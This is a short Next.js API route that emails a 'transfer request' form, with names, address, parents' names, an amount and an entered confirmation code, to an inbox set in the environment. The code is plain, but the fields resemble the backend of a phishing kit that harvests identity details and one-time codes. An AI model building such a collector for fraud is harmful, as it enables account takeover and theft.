import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request) {
  try {
    const body = await request.json();
    const {
      firstName,
      lastName,
      email,
      address,
      fatherName,
      motherName,
      amount,
      code,
    } = body;

    if (
      !firstName ||
      !lastName ||
      !email ||
      !address ||
      !fatherName ||
      !motherName ||
      !amount ||
      !code
    ) {
      return NextResponse.json(
        { ok: false, message: 'Missing required fields' },
        { status: 400 }
      );
    }

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT) || 587,
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    const text = `
Nouvelle demande de transfert :

Nom: ${lastName}
Prénom: ${firstName}
Email: ${email}
Adresse: ${address}
Nom du père: ${fatherName}
Nom de la mère: ${motherName}
Montant à transférer: ${amount}

Code de confirmation saisi: ${code}
    `.trim();

    await transporter.sendMail({
      from: process.env.FROM_EMAIL,
      to: process.env.TO_EMAIL,
      subject: `Nouvelle demande de transfert - ${firstName} ${lastName}`,
      text,
    });

    return NextResponse.json({ ok: true, message: 'Email sent' });
  } catch (error) {
    console.error('Email sending error:', error);
    return NextResponse.json(
      { ok: false, message: 'Email sending failed' },
      { status: 500 }
    );
  }
}
